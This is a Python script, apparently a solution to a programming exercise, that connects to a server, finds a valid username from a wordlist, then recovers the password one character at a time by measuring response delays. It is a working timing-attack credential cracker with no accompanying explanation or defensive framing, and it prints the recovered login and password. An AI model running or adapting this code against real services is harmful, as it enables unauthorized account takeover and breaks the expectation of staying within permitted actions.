from sys import argv
from socket import socket
from string import digits, ascii_letters
from json import dumps, loads
from datetime import datetime

address = (argv[1], int(argv[2]))
client = socket()
client.connect(address)
crack = digits + ascii_letters


with open("logins.txt") as logins:
    logins = logins.readlines()
    logins = [i.replace("\n", "") for i in logins]
    for login in logins:
        client.send(dumps({"login": login, "password": " "}).encode())
        response = loads(client.recv(1024).decode())
        if response['result'] == 'Wrong password!':
            break
    password = ""
    while True:
        for i in crack:
            file_mine = open("pass.txt", 'a')
            client.send(dumps({"login": login, "password": password + i}).encode())
            file_mine.write(password + '\n')
            start = datetime.now()
            response = loads(client.recv(1024).decode())
            finish = datetime.now()
            my_file = open('time.txt', 'a')
            my_file.write(str((finish - start).microseconds) + '\n')
            my_file.close()
            file_mine.close()
            if (finish - start).microseconds > 15000:
                password += i
            elif response['result'] == 'Connection success!':
                password += i
                print(dumps({"login": login, "password": password}))
                exit()
